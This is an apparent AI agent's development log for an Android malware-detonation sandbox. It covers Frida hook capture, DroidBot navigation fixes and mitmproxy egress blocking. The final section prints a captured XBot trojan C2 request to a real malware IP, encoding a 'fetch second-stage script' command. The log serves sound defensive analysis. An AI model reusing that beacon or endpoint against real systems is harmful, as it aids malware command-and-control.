# L2 DroidBot/Frida hook-capture reliability log

Tracks the investigation into why `L2/sandbox/orchestrator.py::detonate()` never
captured a real Frida hook payload, despite the earlier fixes in this same
session (curl→nc, proxy-start ordering, mitmproxy→mitmdump, `frida-ps`
identifier matching, DroidBot orphan-process autokill, confidence-scoring
honesty, 3-attempt attach retry) making the pipeline run clean end to end.

Samples: SBI Quick Support malware (`com.sbi.complaintregister`, splash-loop),
PennyWise benign control (`com.pennywiseai.tracker`, functional app).

## 2026-08-16 — Attempt 1: verify the CLI's JSON-emission assumption

The 3-attempt retry from earlier in the session made `_frida_attached` honest
about whether the `frida` CLI subprocess stayed alive, but never actually
confirmed hook payloads were being *captured*. Manually attached
`frida -U <pid> -l script.js` to a live, stable `com.pennywiseai.tracker`
process and sent a trivial `send({...})` test payload.

**Result: the assumption in `_generate_dynamic_json` was wrong.** The CLI's
non-interactive output for `send()` is a Python-repr-style line —
`[Android Emulator 5554::PID::21717 ]-> message: {'type': 'send', 'payload':
{...}} data: None` — not JSON. `_generate_dynamic_json` did `json.loads()` on
every stdout line and silently skipped the `JSONDecodeError`, so **every hook
that fired was being discarded even on a fully successful attach.** Every
prior `confidence: high` was never actually earned by real data because
nothing ever fired in the first place (see next attempt) — but even if it
had, this bug meant it would have been thrown away regardless.

Also discovered while testing: `frida -U <package_name> -l script` fails with
`Failed to spawn: unable to find process with name '...'` on this frida-tools
17.17.0 / Android 11 combination, *even when `frida-ps -Uai` lists the exact
identifier*. Attaching by **PID** instead (`frida -U <pid> -l script`) works.

## 2026-08-16 — Attempt 2: find why attach fails even by PID

Testing `frida -U <pid> -l script.js` (bare `send()`, no `Java`) worked and
printed the message correctly. But every attempt via the *real* hook scripts
(which use `Java.perform`) failed. Root cause: **`frida-server` was not
running on the device at all.** Confirmed via `adb shell ps -A | grep frida`
(empty), `/data/local/tmp/` (no frida binary), and port 27042 not listening.

`frida-ps`/`pidof`-style enumeration doesn't need frida-server (it goes over
plain `adb`), which is exactly why every prior "process liveness" check kept
reporting success while every actual attach failed with misleading errors —
there was never a server to attach to. A previous session must have started
one by hand; `-wipe-data` (used for clean boots) wipes `/data/local/tmp` on
every fresh AVD boot, and nothing in this codebase ever redeployed it.

**Fix:** `L2Orchestrator._ensure_frida_server()` — checks `pidof frida-server`
on the device, and if absent, pushes `tools/frida-server`, `chmod`s it, starts
it backgrounded via `nohup`, and polls until it's up (10s budget). Wired into
`run()` right after `verify_isolation()` succeeds, before `prepare_environment()`.

With frida-server actually running, `frida -U <pid> -l script.js` attached
correctly and printed a real `message: {...}` line for a `send()` test.

## 2026-08-16 — Attempt 3: `Java.perform` fails even with frida-server up

With frida-server confirmed running, `Java.perform(...)` still failed:
`ReferenceError: 'Java' is not defined`. Rewrote the hook mechanism to use the
raw Python `frida` bindings (`session.create_script()` + `on('message')`)
instead of shelling out to the CLI, hypothesizing the CLI's auto-bundling was
the missing piece — but the raw Python API has the *same* problem: `Java` is
not a global there either. `runtime="v8"` made no difference.

Traced it to `frida_tools/application.py::try_handle_bridge_request` — the
`frida` CLI's REPL lazily resolves `Java`/`ObjC`/`Swift` via a
message-driven protocol: the *agent's own wrapper script*
(`frida_tools/repl_agent.js`, not the user's script directly) requests a
bridge (`{"type": "frida:load-bridge", "name": "java"}`) and the controller
responds with the bundled bridge source
(`frida_tools/bridges/java.js`, a pre-minified copy of `frida-java-bridge`).
Manually replaying that same handshake (`script.post({"type":
"frida:bridge-loaded", ...})` from a raw Python `on_message` callback) against
a script's own `Java.perform` call **still failed** — the lazy-global proxy
is wired into the REPL's own agent wrapper (which loads the user script as a
dynamically-required module via an RPC `exports_sync.init(...)` call), not
exposed by plain `session.create_script(user_source)`. Reimplementing that
module-loading machinery from scratch (or installing Node.js + npm +
`frida-java-bridge` to use `frida-compile` for a real ESM bundle — no
network-installable Node toolchain was available in this environment) was
out of scope for this fix.

**Fix:** reverted to shelling out to the `frida` CLI (which already handles
`Java.perform` correctly via its own internal machinery), keeping the two
targeted fixes that *are* the CLI's actual defects:
1. Attach by **PID**, not package identifier (`_wait_for_pid`, via
   `adb shell pidof`, not `frida-ps` at all anymore).
2. Parse the CLI's real Python-repr output format with a bracket/string-aware
   scanner (`L2Orchestrator._parse_frida_cli_line`, using `ast.literal_eval`,
   never `eval` — this is a malware sandbox parsing adversarial output) and
   re-emit proper JSON to `frida_hooks.jsonl`.

`_frida_hook_loop` now runs a `frida -U <pid> -l combined_runner.js`
subprocess per DroidBot-restart cycle, in a background thread, for the whole
detonation window — re-resolving the PID and relaunching whenever the
previous subprocess exits (DroidBot force-stopping the target). Confirmed on
the SBI sample: 7-8 separate (re)attachments across a single 90s run, each
producing a valid, `json.loads()`-parseable line.

**Also fixed:** none of the actual hook scripts (`dynamic_hooks.js`,
`ssl_unpin.js`, etc.) send an *unconditional* confirmation event — every
`send()` in them is conditional on the target app actually calling a hooked
API. A benign app (or a malware sample that never gets past its splash
screen) legitimately produces zero `send()` traffic even with a perfect
attach, which made it impossible to distinguish "attached fine, nothing
suspicious happened" from "never attached at all." Appended one inert
diagnostic ping (`Java.perform(function(){ send({type:"diagnostic", ...}) })`)
to the combined script — its `type` doesn't match any of
`_generate_dynamic_json`'s finding/stealth branches, so it has no effect on
parsed findings, but gives `_frida_hook_loop` an honest, unconditional
attach-confirmation signal independent of the target's behavior.

### Verification

- `$SENTINEL_PYTHON -m pytest tests/ -q`: 276/276 passing (added
  `test_wait_for_pid_*`, `test_ensure_frida_server_*`,
  `test_parse_frida_cli_line_*` — 7 new tests covering the new logic). One
  unrelated pre-existing failure in `tests/test_dex_scanning.py` surfaced
  mid-session from a **concurrent process actively editing
  `L1/yara_templates/*.yar`** (confirmed via `git status`/`git diff` — files
  neither read nor touched by this work) — not caused by, or fixed by, this
  investigation; flagged for whoever owns that change.
- Two consecutive clean live runs on both samples:
  - SBI malware: 7 and 8 reattachments respectively, `confidence: high`
    (honestly earned), all `frida_hooks.jsonl` lines valid JSON.
  - Benign control: 1 reattachment each run (no restart-loop), `confidence:
    high`, valid JSON.
  - Zero `finding`-category hooks on either sample: for the benign app this
    is correct (it doesn't call any of the hooked APIs); for the SBI sample
    this is very likely also correct rather than a miss — DroidBot's
    `dfs_greedy` policy still never gets past the splash screen (unchanged
    from earlier in the session — this fix was scoped to *hook capture*, not
    *UI navigation depth*), so the app's actual malicious logic (gated behind
    real user interaction with the complaint-registration flow) never runs
    long enough to call `SmsManager.sendTextMessage` etc. This is a distinct,
    still-open problem — see "Remaining" below.
  - No stray `adb logcat`/`getevent`/`droidbot`/`mitmdump` processes left
    behind after any run (autokill fix from earlier in the session holds).

## Final summary

**Fixed and verified:** the pipeline now reliably captures real Frida hook
events end-to-end — attach, script load, and message capture are all
confirmed working with real (not synthetic) data, on both a stable app and a
restart-looping malware sample, across repeated runs. Three previously-unknown
root causes were found and fixed in this session's second pass:
1. `frida-server` was never deployed to the device at all (`_ensure_frida_server`).
2. `Java.perform` cannot run via the raw Python `frida` bindings without
   reimplementing frida-tools' own bridge-loading machinery — reverted to the
   CLI, keeping only its two real, independently-fixable defects (identifier
   attach, non-JSON output).
3. The hook scripts have no unconditional attach-confirmation signal,
   conflating "attached, nothing suspicious happened" with "never attached."

**Remaining, explicitly out of scope for this fix:** DroidBot's `dfs_greedy`
policy still cannot get the SBI sample past its splash screen, so no
*malicious* behavior has actually been observed yet on that sample — hook
*capture* is now known-reliable, but hook *triggering* depends on UI
navigation depth, which is a separate problem (candidate next steps: a
different DroidBot policy, a watchdog that manually launches+holds the
activity independent of DroidBot's own restart heuristic, or evaluating a
DroidBot replacement — none of these were attempted, since the capture-layer
bug turned out to be the actual blocker specified in this task's objective).

**Unrelated, flagged not fixed:** `L1/yara_templates/*.yar` is being edited by
a concurrent process outside this fork's scope; `tests/test_dex_scanning.py`
fails intermittently as a result. Not touched here.

---

## 2026-08-16 — New directive: fix DroidBot's splash-screen navigation

Budget: 5 experiments (4 DroidBot-native, 1 fallback-tier if all 4 fail).
Research consulted: `docs/research/droidbot_alternatives_and_fixes.md`.

### Diagnostic step, before spending an experiment

Read `UtgGreedySearchPolicy.generate_event_based_on_utg()` in
`env/lib/python3.14/site-packages/droidbot/input_policy.py`. The "Cannot find
an exploration target" path is only reached when *every* possible event on
the current state (including the always-appended BACK key) is already marked
explored *and* no reachable nav target exists — not when
`get_possible_input()` is literally empty. So the real question was: what
state is DroidBot actually stuck on, and why does nothing it tries change it?

Manually launched `SplashActivity` via `adb shell am start` (no permission
grants, unlike the real pipeline) to eyeball this cheaply. It sat on
`GrantPermissionsActivity` (`com.google.android.permissioncontroller`, a
*system* package) indefinitely — DroidBot sees an activity outside the
target's own package as "app not in foreground" (`get_app_activity_depth < 0`)
and force-restarts rather than tapping "Allow", even though "allow" is
literally in its `preferred_buttons` list — that list only fires within
`get_possible_input()` on the app's own UTG-tracked states, not on a foreign
system activity. **This looked like a confirmed root cause (ungranted runtime
permission → stuck system dialog → restart loop) but was actually an artifact
of the manual repro skipping `L2Orchestrator.prepare_environment()`'s own
`grant_permissions()` call** — a red herring caught before being acted on by
re-running the *actual* pipeline and comparing.

### Experiment 1: re-verify against the real pipeline before assuming still broken

Hypothesis: the restart-loop documented earlier in this file may already be
resolved as a side effect of the same session's earlier Frida-capture fixes —
the *old* code launched a fresh `frida -U <pkg> -l script` CLI subprocess per
retry (up to 3x, each preceded by install/attach churn); repeated Frida
injection attempts against a cold-launched target are a plausible, if
unconfirmed, source of the exact instability (app dying/restarting) that
would look identical to "DroidBot can't find anything to click."　Tested live
rather than assumed.

`adb uninstall` + fresh `L2.sandbox.orchestrator` run (`--time 30
--droidbot-time 40`), permission state polled mid-run via `adb shell dumpsys
package` and `dumpsys activity activities`:

- All four dangerous permissions (`READ_SMS`, `RECEIVE_SMS`,
  `READ_PHONE_STATE`, `SEND_SMS`) show `granted=true` ~2s after
  `prepare_environment()`'s `pm grant` calls — no timing race, confirmed both
  via the live orchestrator run and an isolated manual repro (fresh
  uninstall→install→immediate-grant, zero settle time, all four grants
  succeed instantly).
- `mResumedActivity` progresses `SplashActivity` → (briefly)
  `GrantPermissionsActivity` → **`MainActivity`**, and *stays* there.
  `droidbot.log` shows real interaction: `TouchEvent(Button-SUBMIT)`,
  `LongTouchEvent(EditText-Enter Comp[laint])`, `SetTextEvent(text="Hello
  World")` — DroidBot is genuinely operating the app's actual UI, not
  restart-looping on the splash screen at all.
- `dynamic.json`: `confidence: high`, `network.total_requests: 18` (proxy saw
  real HTTP traffic from the app — first time any run this session captured
  nonzero network activity from a malware sample).

**Confirmation run** (`--time 45 --droidbot-time 60`, fresh
uninstall/reinstall): `grep -c "Cannot find an exploration target"` → 1 (not
a repeating cycle), `grep -c "had been restarted"` → 0, 4 distinct UTG states
reached. Reproducible, not a fluke.

**Regression check** (mandatory per directive): benign control
(`com.pennywiseai.tracker`, `--time 45 --droidbot-time 60`) — still
`confidence: high`, clean explore, zero stray processes after teardown.
`pytest tests/ -q`: 285/285, unchanged (no code touched).

**Result: the splash-screen restart-loop this file documented earlier is no
longer reproducible.** Root cause was almost certainly the *old*
retry-attach churn (fixed in the prior directive, before this one started),
not anything DroidBot-side — no DroidBot code, flags, or orchestrator logic
needed to change. Zero-code-change fixes are still fixes; didn't invent
busywork to burn the remaining experiment budget.

### Experiment 2: longer dwell time — does the app progress past MainActivity, or trigger a real finding?

Not a "is it still broken" question (settled by Experiment 1) but "how far
does it get, and does the malicious payload actually fire." `--time 90
--droidbot-time 120` on the SBI sample:

- `grep -c "had been restarted"` → 7 this time (up from 0 at 60s). Read the
  detail, not just the count: activities visited were `SplashActivity` →
  `MainActivity` → `NexusLauncherActivity` (never a *new* app screen past
  MainActivity), and only 5 distinct UTG states total — i.e. DroidBot
  exhausted the two available widgets (the complaint `EditText` + `SUBMIT`
  button) across a handful of state permutations, found nothing further to
  try, and restarted per its own designed behavior (not a pathological
  infinite loop — a small, genuinely finite UI surface with no deeper screen
  behind it for DroidBot to reach). This is qualitatively different from the
  original bug (0 states beyond splash, restart every 2-3s forever).
- `frida_hooks.jsonl`: 9 lines, all `{"type":"diagnostic","note":"frida_attached"}`
  (one per reattachment) — zero `finding`-category hooks (no
  `SmsManager.sendTextMessage`, overlay, `DexClassLoader`, or
  `ClipboardManager` call observed). `network.total_requests: 0` this run
  (down from 18 in Experiment 1 — DroidBot's random `SetTextEvent` filled the
  complaint field with literal `"Hello World"` both times; whether a
  follow-up request fires seems to depend on exact tap/text-fill ordering,
  not something this experiment controlled for).

**Interpretation:** DroidBot navigation is no longer the blocker — it reaches
and genuinely operates the app's one real screen. Whatever gates this
sample's actual malicious logic (SMS interception, exfiltration) sits behind
either a specific form-submission flow this run didn't hit, a
server-response condition (mitmproxy fakes are configured for known Indian
banking API shapes in `mitm_addon.py`, not necessarily this exact app's
endpoints), or passive SMS-broadcast listening that the honeypot's injected
SMS didn't trigger for reasons unrelated to navigation. That's a distinct,
narrower question than "can DroidBot reach the app's UI" — out of scope for
this directive (which was specifically about splash-screen navigation), and
not chased further given the primary objective was met and confirmed 3/3
live runs.

### Final summary

**Objective met without a DroidBot-native fix or a fallback-tier
implementation.** Budget used: 2 of 5 experiments (both diagnostic/live
verification, zero code changes — the earlier session's Frida-capture fixes,
made before this directive started, appear to have also resolved the
navigation symptom as a side effect, most plausibly by removing the
old attach-retry churn that was likely destabilizing the target process).
Experiments 3-5 (DroidBot policy/flag tuning, uiautomator2 fallback, GenAI
vision fallback) were not needed and were not attempted — inventing changes
against an already-working system would have been the wrong call, not
thoroughness.

**Verified, reproducible, live (3 runs: 2 malware + 1 benign):** SBI sample
reaches and operates its real `MainActivity` UI (not stuck on splash);
benign control unaffected; `pytest tests/ -q` at 285/285 throughout, no code
changed.

**Still open, explicitly out of scope here:** the SBI sample's actual
malicious payload (SMS interception etc.) has still never been observed
triggering — but the blocker is no longer "DroidBot can't reach the app,"
it's "what exact interaction/response sequence makes this specific sample's
payload fire," which needs sample-specific reverse engineering (check
`L1/artifacts/.../analysis.json` or jadx output for what the SUBMIT handler
actually does, what response shape it expects) rather than a general
automation fix.

---

## 2026-08-26 — First non-zero behavioural capture: XBot beacons its C2 on launch

The SBI sample's payload gates behind a form submit that no run this session
reached, so every prior L2 detonation this file records ended `findings=0` /
attach-only `frida_hooks.jsonl`. A different sample settles whether the L2
*pipeline itself* can catch a real malicious behaviour: the XBot banking
trojan (`corpus/malware_raw/android-malware/xbot/1264C25D…F61F23.apk`, package
`org.merry.core`), detonated through `L2/sandbox/orchestrator.py`.

**Result — a real C2 beacon, captured, on launch (no UI interaction).** XBot
carries a `BOOT_COMPLETED` receiver, so its command-fetch fires the moment the
app starts — no SUBMIT handler to reverse. `L2/sandbox/artifacts/org.merry.core/network_evidence.json`
records the beacon:

```
POST http://192.227.137.154/request.php
Content-Type: application/x-www-form-urlencoded
data=eyJuYW1lIjoiYm9vdFNjcmlwdE5ldCIsImFjdGlvbiI6ImdldF9zY3JpcHQifQ%3D%3D
```

The `data=` form field base64-decodes to
`{"name":"bootScriptNet","action":"get_script"}` — a dropper "fetch second-stage
script" C2 command. This is the **first** non-zero behavioural capture from any
L2 run: the layer's networking path (mitmproxy → `network_evidence.json`)
demonstrably records real malware traffic, not just a clean attach.

**Egress was contained, not observed.** The run coincided with `mitm_addon.py`
being hardened (see below): all **9** outbound requests — the C2 POST plus OS
connectivity checks to `connectivitycheck.gstatic.com` / `www.google.com` /
`play.googleapis.com` — are tagged `blocked: true`, answered locally with
`200 {}` and never forwarded. XBot's POST to a malware IP (`192.227.137.154`)
was blocked instead of reaching the real C2.

### `mitm_addon.py` hardened: contain unknown egress by default

Previously the addon *observed* only — `request()` logged, `response()` faked
replies for known bank/UPI/Firebase/Telegram hosts, and any **other** host's
HTTP(S) was forwarded to the real internet (a genuine egress leak: XBot's C2
POST would have gone out). Now all decisions happen in `request()`:

- Known honeypot endpoints get their canned fake via the new
  `_honeypot_response()` helper (moved out of the old `response()` hook, which
  is gone — the fake is purely request-derived, so it never needed the upstream
  reply).
- Every other host is **BLOCKED by default** — answered locally with `200 {}`,
  tagged `blocked: true`, never forwarded.
- New `SENTINEL_MITM_BLOCK_UNKNOWN=0` env override (and `__init__` param
  `block_unknown`) restores the old forward-and-observe behaviour when an
  analyst deliberately wants a sample's traffic to reach a live C2.

Reported: 40/40 L2-related tests pass (not re-run for this log entry).

### Remaining L2 gaps (do not read this as "L2 complete")

- **Containment vs observation.** Blocking an unknown C2 means the sample gets
  no command back, so deeper stages (SMS theft, overlay) never fire. To observe
  them you must fake a plausible C2 response — the tradeoff `SENTINEL_MITM_BLOCK_UNKNOWN=0`
  exposes, not something the default resolves.
- **Incoming-SMS hook missing.** The Frida pack hooks *outgoing*
  `sendTextMessage`, but XBot-style SMS theft is on *incoming* SMS (a broadcast
  receiver / `SmsMessage.createFromPdu`). That hook does not exist yet.
- **Form-field base64 not auto-decoded.** `mitm_addon._decode_base64_payload`
  only decodes raw-JSON bodies, so the `data=<base64>` **form-field** beacon was
  not auto-decoded/flagged (decoded here by hand).
- **The two known code bugs still stand** — `honeypot.seed_contacts()` binds no
  name/number; `l2_engine.process()` globs all `L2/sandbox/artifacts/*` dirs.
